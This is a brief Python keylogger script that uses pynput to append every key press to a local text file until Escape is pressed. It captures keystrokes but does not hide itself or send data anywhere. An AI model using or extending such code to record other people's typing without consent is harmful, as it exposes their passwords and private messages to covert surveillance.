from pynput.keyboard import Key, Listener

log_file = 'keystroke_log.txt'  # Path to the log file

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(key))
    except Exception as e:
        print('Error:', e)

def on_release(key):
    if key == Key.esc:  # Stop listener by pressing the Escape key
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
